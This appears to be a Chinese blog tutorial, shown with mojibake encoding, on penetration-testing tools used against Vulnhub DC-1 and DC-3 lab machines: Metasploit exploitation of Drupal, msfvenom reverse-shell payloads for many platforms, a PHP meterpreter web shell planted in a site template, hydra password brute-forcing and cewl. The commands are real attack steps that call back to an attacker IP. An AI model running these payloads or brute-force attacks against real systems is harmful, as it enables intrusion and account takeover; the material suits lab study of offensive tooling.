<h1 id="å¸¸ç”¨å·¥å…·çš„ä½¿ç”¨"><a href="#å¸¸ç”¨å·¥å…·çš„ä½¿ç”¨" class="headerlink" title="å¸¸ç”¨å·¥å…·çš„ä½¿ç”¨"></a>å¸¸ç”¨å·¥å…·çš„ä½¿ç”¨</h1><h2 id="1ï¼‰msf"><a href="#1ï¼‰msf" class="headerlink" title="1ï¼‰msf"></a>1ï¼‰msf</h2><h3 id="ï¼ˆ1ï¼‰msfåŸºæœ¬ä½¿ç”¨"><a href="#ï¼ˆ1ï¼‰msfåŸºæœ¬ä½¿ç”¨" class="headerlink" title="ï¼ˆ1ï¼‰msfåŸºæœ¬ä½¿ç”¨"></a>ï¼ˆ1ï¼‰msfåŸºæœ¬ä½¿ç”¨</h3><p><code>ä¸€ä¸ªæ¼æ´åˆ©ç”¨æ¡†æ¶,å¯¹è®¡ç®—æœºè½¯ä»¶æ¼æ´è¿›è¡Œæ”»å‡»</code></p>
<p><strong>è¿™é‡Œä»¥vulnhub dc1ä¸ºä¾‹</strong></p>
<p>ç»ˆç«¯è¾“å…¥<code>msfconsole</code>ï¼Œè¿›å…¥msfç•Œé¢ï¼Œæˆ–è€…èœå•ä¹Ÿå¯ä»¥æ‰“å¼€</p>
<p><img src="/post/tooluse(Commontools)/image-20220830094506049.png" alt="image-20220830094506049"></p>
<figure class="highlight openscad"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">search</span> drupalï¼Œæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰drupalå¯ä»¥åˆ©ç”¨çš„è„šæœ¬</span><br><span class="line"><span class="comment">/*å¯¹äºå…¶ä»–å‘½ä»¤ï¼Œå¯ä»¥ç”¨helpæŸ¥è¯¢*/</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220830094939297.png" alt="image-20220830094939297"></p>
<p>è¿™é‡Œå¯ä»¥é€‰æ‹©ä¸åŒçš„è„šæœ¬ï¼Œä¸‹é¢ä»¥ç¼–å·1çš„è„šæœ¬ä¸ºä¾‹ï¼Œå…¶ä»–çš„åº”è¯¥ä¹Ÿå¯ä»¥</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">use</span> <span class="number">1</span>ï¼Œè¿›å…¥ç¼–å·<span class="number">1</span>è„šæœ¬çš„è¿è¡Œç¯å¢ƒ</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220830095106784.png" alt="image-20220830095106784"></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">show</span> <span class="keyword">options</span>,æŸ¥çœ‹è„šæœ¬è¿è¡Œçš„æ‰€éœ€è¦é…ç½®çš„é¡¹ç›®</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220830105519336.png" alt="image-20220830105519336"></p>
<p><code>Required</code>æ˜¯è¦æ±‚å¡«çš„ï¼Œyesæ˜¯å¿…å¡«é¡¹ï¼Œnoæ˜¯éå¿…å¡«é¡¹</p>
<p>è¿™é‡Œçš„<code>RHOSTS</code>æ²¡æœ‰å¡«ï¼Œè¿™é‡Œæ˜¯è¦æ±‚å¡«å…¥<code>target hosts</code>ä¹Ÿå°±æ˜¯ç›®æ ‡åœ°å€ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é¶æœºçš„åœ°å€</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">set</span> RHOSTS <span class="comment">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220830110143969.png" alt="image-20220830110143969"></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">å†è¾“å…¥<span class="built_in">run</span>ï¼Œè¿è¡Œè„šæœ¬</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220830110303594.png" alt="image-20220830110303594"></p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">shell</span>ï¼Œè¿›å…¥<span class="built_in">shell</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220830110551273.png" alt="image-20220830110551273"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">whoami</span>ï¼ŒæŸ¥çœ‹å½“å‰çš„æƒé™</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220830110648417.png" alt="image-20220830110648417"></p>
<p>å‘ç°æ˜¯ä¸ªä½æƒé™çš„è´¦å·</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">ls</span>ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°å½“å‰çš„ç›®å½•æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220830110825217.png" alt="image-20220830110825217"></p>
<p>ä½†æ˜¯ä¸€å †ä¸œè¥¿æŒ¤åœ¨ä¸€èµ·ï¼Œè¿˜æ˜¯æœ‰äº›ä¸å¤ªæ–¹ä¾¿</p>
<p><strong>è¾“å…¥ä¸‹æ–¹æŒ‡ä»¤ï¼Œåˆ©ç”¨pythonè¿›å…¥äº¤äº’å¼shellã€å›ºå®šå§¿åŠ¿ï¼Œè¦è®°ä½ã€‘</strong></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220830110907408.png" alt="image-20220830110907408"></p>
<h3 id="ï¼ˆ2ï¼‰msfåé—¨ç”Ÿæˆæ¨¡å—"><a href="#ï¼ˆ2ï¼‰msfåé—¨ç”Ÿæˆæ¨¡å—" class="headerlink" title="ï¼ˆ2ï¼‰msfåé—¨ç”Ÿæˆæ¨¡å—"></a>ï¼ˆ2ï¼‰msfåé—¨ç”Ÿæˆæ¨¡å—</h3><h4 id="æ™®é€šç”Ÿæˆ"><a href="#æ™®é€šç”Ÿæˆ" class="headerlink" title="æ™®é€šç”Ÿæˆ"></a>æ™®é€šç”Ÿæˆ</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">p</span> æœ‰æ•ˆè½½è· -f è¾“å‡ºæ ¼å¼ -o è¾“å‡ºæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -f exe -o payload<span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>

<h4 id="ç¼–ç ç”Ÿæˆ"><a href="#ç¼–ç ç”Ÿæˆ" class="headerlink" title="ç¼–ç ç”Ÿæˆ"></a>ç¼–ç ç”Ÿæˆ</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -a ç³»ç»Ÿæ¶æ„ --platform ç³»ç»Ÿå¹³å° -p æœ‰æ•ˆè½½è· <span class="attribute">lhost</span>=æ”»å‡»æœºIP <span class="attribute">lport</span>=æ”»å‡»æœºç«¯å£ -e ç¼–ç æ–¹å¼ -iç¼–ç æ¬¡æ•° -f è¾“å‡ºæ ¼å¼ -o è¾“å‡ºæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="attribute">lhost</span>=192.168.1.1 <span class="attribute">lport</span>=8888 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</span><br></pre></td></tr></table></figure>

<h4 id="ä»¥DC-3ä¸¾ä¸ªä¾‹å­"><a href="#ä»¥DC-3ä¸¾ä¸ªä¾‹å­" class="headerlink" title="*ä»¥DC-3ä¸¾ä¸ªä¾‹å­"></a>*ä»¥DC-3ä¸¾ä¸ªä¾‹å­</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">è¾“å…¥msfvenom -<span class="selector-tag">p</span> php/meterpreter/reverse_tcp LHOST=kaliçš„ip LPORT=<span class="number">4444</span> -f raw &gt; shell<span class="selector-class">.php</span></span><br><span class="line"><span class="comment">//æ³¨æ„ï¼ŒLHOSTæ˜¯kaliçš„ip</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220903222910397.png" alt="image-20220903222910397"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220903144052531.png" alt="image-20220903144052531"></p>
<p>å‘ç°ç›®å½•ä¸‹ç”Ÿæˆäº† <code>shell.php</code></p>
<p><img src="/post/tooluse(Commontools)/image-20220903223007361.png" alt="image-20220903223007361"></p>
<p>ç„¶ååœ¨ç½‘ç«™æ–°å»ºä¸€ä¸ªphpæ–‡ä»¶</p>
<p><img src="/post/tooluse(Commontools)/image-20220903221140645.png" alt="image-20220903221140645"></p>
<p>ç„¶åæŠŠæœ¨é©¬å†…å®¹å¯¼å…¥è¿›å»</p>
<p><img src="/post/tooluse(Commontools)/image-20220903223039265.png" alt="image-20220903223039265"></p>
<p>ç„¶åä¿å­˜ä¸€ä¸‹</p>
<p><img src="/post/tooluse(Commontools)/image-20220903221238918.png" alt="image-20220903221238918"></p>
<p>ç„¶åè¯•è¯•èƒ½ä¸èƒ½è®¿é—®æœ¨é©¬</p>
<p>ç„¶åæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°æœ¨é©¬æ–‡ä»¶è·¯å¾„ï¼Œè¿›è¡Œè®¿é—®çœ‹çœ‹ï¼Œèƒ½ä¸èƒ½è®¿é—®æˆåŠŸ</p>
<p>å› ä¸ºæˆ‘ä»¬æ–‡ä»¶æ˜¯åœ¨<code>/templates/protostar/less/</code>ä¸‹ä¸Šä¼ çš„ï¼Œæ‰€ä»¥è®¿é—®</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar<span class="regexp">/less/</span><span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220903221336853.png" alt="image-20220903221336853"></p>
<p>çœ‹åˆ°&#x2F;*ï¼Œçœ‹æ¥æ˜¯å¯ä»¥æˆåŠŸè®¿é—®</p>
<h5 id="msfåˆ©ç”¨æœ¨é©¬"><a href="#msfåˆ©ç”¨æœ¨é©¬" class="headerlink" title="msfåˆ©ç”¨æœ¨é©¬"></a>msfåˆ©ç”¨æœ¨é©¬</h5><p>ç„¶åç”¨msfè¿›è¡Œåˆ©ç”¨</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">å…ˆè¾“å…¥msfconsoleï¼Œè¿›å…¥msf</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ç„¶åè¾“å…¥</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">è¿›å…¥æˆ‘ä»¬åˆ©ç”¨msfåˆ¶ä½œçš„æœ¨é©¬åˆ©ç”¨ç¯å¢ƒ</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220903220102252.png" alt="image-20220903220102252"></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">show</span> <span class="keyword">options</span></span><br><span class="line">çœ‹çœ‹éœ€è¦å¡«å†™ä»€ä¹ˆ</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220903220250819.png" alt="image-20220903220250819"></p>
<p>çœ‹åˆ°LHOSTç›‘å¬çš„ipæ²¡æœ‰å¡«å†™</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">set</span> LHOST <span class="comment">192.168.133.140</span> //<span class="comment">kali</span>çš„<span class="comment">ip</span></span><br></pre></td></tr></table></figure>



<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">run</span>ï¼Œè¿è¡Œï¼Œä¼šå¡ä½</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±æ˜¯åœ¨ç­‰å¾…æˆ‘ä»¬çš„æœ¨é©¬è¿è¡Œï¼Œæˆ‘ä»¬åªéœ€è¦åˆ·æ–°ä¸€ä¸‹æˆ‘ä»¬ä¹‹å‰è®¿é—®æœ¨é©¬çš„ç½‘é¡µ</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220903223414089.png" alt="image-20220903223414089"></p>
<p>åé¢æ“ä½œä¸èµ˜è¿°</p>
<h4 id="msfvenom-â€”list-archs"><a href="#msfvenom-â€”list-archs" class="headerlink" title="msfvenom â€”list archs"></a>msfvenom â€”list archs</h4><p>#æŸ¥çœ‹æ”¯æŒçš„ç³»ç»Ÿæ¶æ„</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">aarch<span class="number">64</span><span class="punctuation">,</span> armbe<span class="punctuation">,</span> armle<span class="punctuation">,</span> cbea<span class="punctuation">,</span> cbea<span class="number">64</span><span class="punctuation">,</span> cmd<span class="punctuation">,</span> dalvik<span class="punctuation">,</span> firefox<span class="punctuation">,</span> java<span class="punctuation">,</span> mips<span class="punctuation">,</span> mips<span class="number">64</span><span class="punctuation">,</span> mips<span class="number">64</span>le<span class="punctuation">,</span> mipsbe<span class="punctuation">,</span> mipsle<span class="punctuation">,</span> nodejs<span class="punctuation">,</span> php<span class="punctuation">,</span> ppc<span class="punctuation">,</span> ppc<span class="number">64</span><span class="punctuation">,</span> ppc<span class="number">64</span>le<span class="punctuation">,</span> ppce<span class="number">500</span>v<span class="number">2</span><span class="punctuation">,</span> python<span class="punctuation">,</span> r<span class="punctuation">,</span> ruby<span class="punctuation">,</span> sparc<span class="punctuation">,</span> sparc<span class="number">64</span><span class="punctuation">,</span> tty<span class="punctuation">,</span> <span class="keyword">x</span><span class="number">64</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span><span class="punctuation">,</span> zarch</span><br></pre></td></tr></table></figure>

<h4 id="msfvenom-â€”list-platforms"><a href="#msfvenom-â€”list-platforms" class="headerlink" title="msfvenom â€”list platforms"></a>msfvenom â€”list platforms</h4><p>#æŸ¥çœ‹æ”¯æŒç³»ç»Ÿå¹³å°</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">aix, <span class="keyword">android, </span>apple_ios, <span class="keyword">bsd, </span><span class="keyword">bsdi, </span>cisco, firefox, freebsd, hardware, hpux, irix, <span class="keyword">java, </span><span class="keyword">javascript, </span><span class="keyword">juniper, </span>linux, mainframe, <span class="keyword">multi, </span>netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unifi, unix, unknown, windows</span><br></pre></td></tr></table></figure>



<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">msfvenom -l payload <span class="comment">#åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„payload</span></span><br><span class="line"></span><br><span class="line">msfvenom -l formats <span class="comment">#åˆ—å‡ºæ‰€æœ‰çš„è¾“å‡ºæ ¼å¼</span></span><br><span class="line"></span><br><span class="line">msfvenom -l <span class="built_in">encrypt</span> <span class="comment">#åˆ—å‡ºæ‰€æœ‰çš„åŠ å¯†æ–¹å¼</span></span><br><span class="line"></span><br><span class="line">msfvenom -l encoders <span class="comment">#åˆ—å‡ºæ‰€æœ‰çš„ç¼–ç å™¨</span></span><br></pre></td></tr></table></figure>

<h4 id="å¸¸è§ç”Ÿæˆæ ¼å¼"><a href="#å¸¸è§ç”Ÿæˆæ ¼å¼" class="headerlink" title="å¸¸è§ç”Ÿæˆæ ¼å¼"></a>å¸¸è§ç”Ÿæˆæ ¼å¼</h4><h5 id="1ã€-Windows"><a href="#1ã€-Windows" class="headerlink" title="1ã€ Windows"></a>1ã€ Windows</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> windows -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -<span class="selector-tag">i</span> <span class="number">3</span> -e x86/shikata_ga_nai -f exe -o payload<span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>

<h5 id="2ã€Linux"><a href="#2ã€Linux" class="headerlink" title="2ã€Linux"></a>2ã€Linux</h5><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> linux -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> linux/x86/meterpreter/reverse_tcp -f elf -o payload<span class="selector-class">.elfxxxxxxxxxx</span>Â msfvenom <span class="attr">--platform</span> linux -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> linux/x86/meterpreter/reverse_tcp -f elf -o payload.elf1</span><br></pre></td></tr></table></figure>

<h5 id="3ã€Mac"><a href="#3ã€Mac" class="headerlink" title="3ã€Mac"></a>3ã€Mac</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> osx -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> osx/x86/shell_reverse_tcp -f macho -o payload<span class="selector-class">.macho</span></span><br></pre></td></tr></table></figure>

<h5 id="4ã€Android"><a href="#4ã€Android" class="headerlink" title="4ã€Android"></a>4ã€Android</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">msfvenom -p android<span class="regexp">/meterpreter/</span>reverse_tcp -o payload.apk</span><br></pre></td></tr></table></figure>

<h5 id="5ã€Aspx"><a href="#5ã€Aspx" class="headerlink" title="5ã€Aspx"></a>5ã€Aspx</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> windows-<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -f aspx -o payload<span class="selector-class">.aspx</span></span><br></pre></td></tr></table></figure>

<h5 id="6ã€JSP"><a href="#6ã€JSP" class="headerlink" title="6ã€JSP"></a>6ã€JSP</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> java -<span class="selector-tag">p</span> java/jsp_shell_reverse_tcp -f raw -o payload<span class="selector-class">.jsp</span></span><br></pre></td></tr></table></figure>

<h5 id="7ã€PHP"><a href="#7ã€PHP" class="headerlink" title="7ã€PHP"></a>7ã€PHP</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php</span><br></pre></td></tr></table></figure>

<h5 id="8ã€BASH"><a href="#8ã€BASH" class="headerlink" title="8ã€BASH"></a>8ã€BASH</h5><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">msfvenom -p <span class="keyword">cmd</span><span class="language-bash">/unix/reverse_bash -f raw -o shell.sh</span></span><br></pre></td></tr></table></figure>

<h5 id="9ã€Python"><a href="#9ã€Python" class="headerlink" title="9ã€Python"></a>9ã€Python</h5><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">msfvenom -<span class="keyword">p</span> <span class="keyword">python</span>/meterpreter/reverse_tcp -<span class="keyword">f</span> raw -<span class="keyword">o</span> <span class="keyword">shell</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>



<h4 id="Msfvenomå¸¸ç”¨å‘½ä»¤å‚æ•°"><a href="#Msfvenomå¸¸ç”¨å‘½ä»¤å‚æ•°" class="headerlink" title="Msfvenomå¸¸ç”¨å‘½ä»¤å‚æ•°"></a>Msfvenomå¸¸ç”¨å‘½ä»¤å‚æ•°</h4><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">-l, <span class="comment">--list &lt;type&gt; </span></span><br><span class="line"><span class="comment"># åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„é¡¹ç›®ï¼Œå…¶ä¸­å€¼å¯ä»¥è¢«è®¾ç½®ä¸º payloads, encoders, nops, platforms, archs, encrypt, formatsç­‰ç­‰</span></span><br><span class="line">-p, <span class="comment">--payload &lt;payload&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šç‰¹å®šçš„ Payloadï¼Œå¦‚æœè¢«è®¾ç½®ä¸º - ï¼Œé‚£ä¹ˆä»æ ‡å‡†è¾“å…¥æµä¸­è¯»å–</span></span><br><span class="line"><span class="comment">--list-options </span></span><br><span class="line"><span class="comment"># åˆ—å‡º--payload &lt;value&gt; çš„æ ‡å‡†ï¼Œé«˜çº§å’Œè§„é¿é€‰é¡¹</span></span><br><span class="line">-f, <span class="comment">--format &lt;format&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®š Payload çš„è¾“å‡ºæ ¼å¼(ä½¿ç”¨ --list formats åˆ—å‡º)</span></span><br><span class="line">-e, <span class="comment">--encoder &lt;encoder&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šä½¿ç”¨çš„ Encoder (ä½¿ç”¨ --list encoders åˆ—å‡º)</span></span><br><span class="line"><span class="comment">--sec-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># ç”Ÿæˆå¤§å‹WindowsäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ä½¿ç”¨çš„æ–°åç§°ã€‚é»˜è®¤å€¼ï¼šéšæœº4ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">--smallest </span></span><br><span class="line"><span class="comment"># ä½¿ç”¨æ‰€æœ‰å¯ç”¨çš„ç¼–ç å™¨ç”Ÿæˆæœ€å°çš„payload</span></span><br><span class="line"><span class="comment">--encrypt &lt;value&gt; </span></span><br><span class="line"><span class="comment"># åº”ç”¨äºshellcodeçš„åŠ å¯†æˆ–ç¼–ç ç±»å‹ (ä½¿ç”¨--list encrypt åˆ—å‡º)</span></span><br><span class="line"><span class="comment">--encrypt-key &lt;value&gt; </span></span><br><span class="line"><span class="comment"># ç”¨äºåŠ å¯†çš„å¯†é’¥</span></span><br><span class="line"><span class="comment">--encrypt-iv &lt;value&gt; </span></span><br><span class="line"><span class="comment"># åŠ å¯†çš„åˆå§‹åŒ–å‘é‡</span></span><br><span class="line">-<span class="keyword">a</span>, <span class="comment">--arch &lt;arch&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šç›®æ ‡ç³»ç»Ÿæ¶æ„(ä½¿ç”¨ --list archs åˆ—å‡º)</span></span><br><span class="line"><span class="comment">--platform &lt;platform&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šç›®æ ‡ç³»ç»Ÿå¹³å° (ä½¿ç”¨ --list platforms åˆ—å‡º)</span></span><br><span class="line">-o, <span class="comment">--out &lt;path&gt; </span></span><br><span class="line"><span class="comment"># ä¿å­˜payloadæ–‡ä»¶</span></span><br><span class="line">-b, <span class="comment">--bad-chars &lt;list&gt; </span></span><br><span class="line"><span class="comment"># è®¾ç½®éœ€è¦åœ¨ Payload ä¸­é¿å…å‡ºç°çš„å­—ç¬¦ï¼Œå¦‚ï¼š &#x27;\x00\xff&#x27;</span></span><br><span class="line">-n, <span class="comment">--nopsled &lt;length&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®š nop åœ¨ payload ä¸­çš„æ•°é‡</span></span><br><span class="line">-s, <span class="comment">--space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># è®¾ç½®æœªç»ç¼–ç çš„ Payload çš„æœ€å¤§é•¿åº¦</span></span><br><span class="line"><span class="comment">--encoder-space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># ç¼–ç åçš„ Payload çš„æœ€å¤§é•¿åº¦</span></span><br><span class="line">-i, <span class="comment">--iterations &lt;count&gt; </span></span><br><span class="line"><span class="comment"># è®¾ç½® Payload çš„ç¼–ç æ¬¡æ•°</span></span><br><span class="line">-c, <span class="comment">--add-code &lt;path&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šåŒ…å«ä¸€ä¸ªé¢å¤–çš„win32 shellcodeæ–‡ä»¶</span></span><br><span class="line">-x, <span class="comment">--template &lt;path&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šä¸€ä¸ªç‰¹å®šçš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿</span></span><br><span class="line">-k, <span class="comment">--keep </span></span><br><span class="line"><span class="comment"># ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠŸèƒ½ï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ</span></span><br><span class="line">-v, <span class="comment">--var-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šä¸€ä¸ªå˜é‡åï¼ˆå½“æ·»åŠ  -f å‚æ•°çš„æ—¶å€™ï¼Œä¾‹å¦‚ -f pythonï¼Œé‚£ä¹ˆè¾“å‡ºä¸º python ä»£ç ï¼Œ payload ä¼šè¢«æŒ‰è¡Œæ ¼å¼åŒ–ä¸º python ä»£ç ï¼Œè¿½åŠ åˆ°ä¸€ä¸ª python å˜é‡ä¸­ï¼Œè¿™ä¸ªå‚æ•°å³ä¸ºæŒ‡å®š python å˜é‡çš„å˜é‡åï¼‰</span></span><br><span class="line">-t, <span class="comment">--timeout &lt;second&gt; </span></span><br><span class="line"><span class="comment"># è®¾ç½®ä»STDINè¯»å–payloadçš„ç­‰å¾…æ—¶é—´ï¼ˆé»˜è®¤ä¸º30,0ä¸ºç¦ç”¨ï¼‰</span></span><br><span class="line">-h, <span class="comment">--help </span></span><br><span class="line"><span class="comment"># å¸®åŠ©</span></span><br></pre></td></tr></table></figure>



<h2 id="2ï¼‰hydra"><a href="#2ï¼‰hydra" class="headerlink" title="2ï¼‰hydra"></a>2ï¼‰hydra</h2><blockquote>
<p><code>hydraæ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„çˆ†ç ´å·¥å…·,æš´åŠ›ç ´è§£å¼±å¯†ç ,æ˜¯ä¸€ä¸ªæ”¯æŒä¼—å¤šåè®®çš„çˆ†ç ´å·¥å…·</code></p>
</blockquote>
<h3 id="1-çˆ†ç ´ç”¨æˆ·å¯†ç "><a href="#1-çˆ†ç ´ç”¨æˆ·å¯†ç " class="headerlink" title="1.çˆ†ç ´ç”¨æˆ·å¯†ç "></a>1.çˆ†ç ´ç”¨æˆ·å¯†ç </h3><p><strong>è¿™é‡Œä»¥vulnhub dc1ä¸ºä¾‹</strong></p>
<p>ç”¨äº†<code>hydra</code>[æµ·å¾·æ‹‰]å·¥å…·ï¼Œå¯¹<code>flag4</code>ç”¨æˆ·è¿›è¡Œçˆ†ç ´</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -<span class="selector-tag">p</span> /usr/share/wordlists/rockyou<span class="selector-class">.txt</span><span class="selector-class">.gz</span> <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-læ˜¯æŒ‡å®šç”¨æˆ·æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªç”¨æˆ·çš„æ–‡ä»¶ï¼Œ-<span class="selector-tag">p</span>æ˜¯æŒ‡å®šå¯†ç æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªå¯†ç çš„æ–‡ä»¶ï¼Œsshå°±æ˜¯</span><br><span class="line">ç”¨æˆ·æ‰€åœ¨çš„ç½‘ç«™</span><br><span class="line"></span><br><span class="line">ä¸Šé¢-<span class="selector-tag">p</span>çš„æ–‡ä»¶æ˜¯kaliè‡ªå¸¦çš„å¯†ç åŒ…ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨å…¶ä»–çš„</span><br><span class="line"></span><br><span class="line">-s ç«¯å£</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220830211739164.png" alt="image-20220830211739164"></p>
<p>è¿™é‡Œå°±çœ‹åˆ°<code>flag4</code>ç”¨æˆ·çš„å¯†ç è¢«çˆ†ç ´å‡ºæ¥ï¼Œæ˜¯<code>orange</code></p>
<p>ç„¶åç”¨<code>ssh</code>è¿æ¥</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ssh <span class="symbol">flag4@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.136</span></span><br><span class="line">ç„¶åyes</span><br><span class="line">ç„¶åè¾“å…¥å¯†ç ï¼šorange</span><br></pre></td></tr></table></figure>

<p><img src="/post/tooluse(Commontools)/image-20220830211817515.png" alt="image-20220830211817515"></p>
<h2 id="3ï¼‰cewl"><a href="#3ï¼‰cewl" class="headerlink" title="3ï¼‰cewl"></a>3ï¼‰cewl</h2><blockquote>
<p> <code>Cewlæ˜¯ä¸€ä¸ªé€šè¿‡æŒ‡å®šurlåŠæ·±åº¦,ä½¿ç”¨çˆ¬è™«æŠ€æœ¯,ç”Ÿæˆå­—å…¸çš„ä¸€ä¸ªå·¥å…·ã€‚Cewlæ˜¯é€šè¿‡rubyç¼–å†™,é€šè¿‡çˆ¬å–ç½‘ç«™å¹¶æå–ç‹¬ç«‹çš„å•è¯ä¿å­˜ä¸ºå­—å…¸,å¯ä»¥å’ŒJohn the Ripperç­‰å·¥å…·é…åˆä½¿ç”¨ã€‚</code></p>
